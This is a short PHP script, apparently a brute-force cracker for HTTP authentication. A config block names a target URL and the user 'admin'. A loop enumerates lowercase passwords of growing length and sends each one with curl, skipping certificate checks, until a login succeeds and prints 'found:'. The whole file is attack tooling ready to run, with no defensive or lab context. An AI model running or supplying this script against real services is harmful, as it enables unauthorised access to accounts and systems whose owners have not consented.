<?php
    define("URL","http://127.0.0.1/index.html");
    define("AUTH_USER","admin");
    define("TIMEOUT",30);
    define("LOWERCASE",TRUE);
    define("NUMBERS",FALSE);
    define("UPPERCASE",FALSE);
    define("SPECIALCHARS",FALSE);
    define("VERBOSE",TRUE);
    define("DEBUG",TRUE);
    /* END CONFIG.... START CRACKING */

    $charset = "";
    if(LOWERCASE) $charset .= "abcdefghijklmnopqrstuvwxyz";
    if(NUMBERS) $charset .= "0123456789";
    if(UPPERCASE) $charset .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    if(SPECIALCHARS) $charset .= "~`!@#$%^&*()-_\/'\";:,.+=<>? ";
    $base = strlen($charset);
    $found = 0;
    $maxdigit = 0;
    $charattempt = array(); //little endian
    $charattempt[0] = 0;
    while(!$found){
        $auth_pass = "";
        for($i=0;$i<=$maxdigit;$i++){
            if($charattempt[$i] >= ($base-1)){
                if($i==$maxdigit){
                    $maxdigit++;
                    $charattempt[$i]=0;
                    $charattempt[$i+1]=0;
                    $auth_pass .= $charset[$charattempt[$i]];
                    $auth_pass .= $charset[$charattempt[$i+1]];
                    break;
                }
                else{
                    $charattempt[$i]=0;
                    ++$charattempt[$i+1];
                    $auth_pass .= $charset[$charattempt[$i]];
                }
            }
            else{
                if($i==0) ++$charattempt[$i];
                $auth_pass .= $charset[$charattempt[$i]];
            }
        }
        $auth_pass = strrev($auth_pass);
        if(DEBUG){
            echo $auth_pass."\n";
        }
        else{
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, URL);
            //curl_setopt($ch, CURLOPT_HEADER, 0);
            //curl_setopt($ch, CURLOPT_USERAGENT, $ua);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            curl_setopt($ch, CURLOPT_FAILONERROR, 1); // Fail on HTTP code >= 400.
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            if(AUTH_USER || $auth_pass)
            {
                curl_setopt($ch, CURLOPT_USERPWD, AUTH_USER.":".$auth_pass);
                curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
            }
            if(TIMEOUT){
                curl_setopt($ch, CURLOPT_TIMEOUT, TIMEOUT); // Timeout for entire call.
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
            }
            // To follow 302 redirects:
            // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            // curl_setopt($ch, CURLOPT_MAXREDIRS, 100);
            $contents = curl_exec($ch);
            if($error = curl_error($ch))
            {
                if(VERBOSE) echo "tried: ".$auth_pass."\n";
            }
            else{
                $found = 1;
                echo "found: ".$auth_pass."\n";
            }
            curl_close($ch);
        }
    }
?>
